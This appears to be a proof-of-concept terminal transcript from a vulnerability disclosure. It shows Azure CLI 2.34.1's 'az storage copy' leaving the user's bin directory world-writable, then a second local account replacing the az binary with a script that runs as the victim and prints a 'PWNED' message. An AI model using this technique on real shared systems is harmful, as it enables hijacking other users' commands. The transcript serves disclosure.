# Remove existing install
victim@scw-angry-chandrasekhar:~$ rm -rf bin/ lib/

# Install a fresh copy of the az cli
victim@scw-angry-chandrasekhar:~$ curl -L https://aka.ms/InstallAzureCli | bash
[installation transcript removed]
-- Installation successful.
-- Run the CLI with /home/victim/bin/az --help

# bin/ has reasonable permissions
victim@scw-angry-chandrasekhar:~$ ls -lad bin
drwxrwxr-x 2 victim victim 4096 Mär 17 14:07 bin

# Invoke "az storage copy" to trigger the behavior

victim@scw-angry-chandrasekhar:~$ az storage copy
Positional argument '<EXTRA_OPTIONS>' is experimental and under development. Reference and support levels: https://aka.ms/CLI_refstatus
Azcopy command: ['/home/victim/bin/azcopy', 'copy', 'https://None.blob.core.windows.net', 'https://None.blob.core.windows.net']
INFO: Scanning...

failed to perform copy command due to error: Login Credentials missing. No SAS token or OAuth token is present and the resource is not public
Failed to perform copy operation.



# bin/ is now world writeable
victim@scw-angry-chandrasekhar:~$ ls -lad bin
drwxrwxrwx 2 victim victim 4096 Mär 17 14:09 bin

# version info
victim@scw-angry-chandrasekhar:~$ az version
{
  "azure-cli": "2.34.1",
  "azure-cli-core": "2.34.1",
  "azure-cli-telemetry": "1.0.6",
  "extensions": {}
}


# ATTACKER ACTIVITY BEGINS HERE - note different user

# This means the attacker cannot directly overwrite the files inside...
attacker@scw-angry-chandrasekhar:/home/victim/bin$ echo -ne '#!/bin/bash\necho "IF YOU READ THIS YOU ($(whoami)) ARE PWNED"' > /home/victim/bin/az
bash: /home/victim/bin/az: Permission denied

# ... but they can first delete then recreate it!
attacker@scw-angry-chandrasekhar:/home/victim/bin$ rm /home/victim/bin/az
rm: remove write-protected regular file '/home/victim/bin/az'? y
attacker@scw-angry-chandrasekhar:/home/victim/bin$ echo -ne '#!/bin/bash\necho "IF YOU READ THIS YOU ($(whoami)) ARE PWNED"' > /home/victim/bin/az
attacker@scw-angry-chandrasekhar:/home/victim/bin$ chmod +x /home/victim/bin/az


# BACK TO THE VICTIM ACCOUNT!

victim@scw-angry-chandrasekhar:~$ az version
IF YOU READ THIS YOU (victim) ARE PWNED
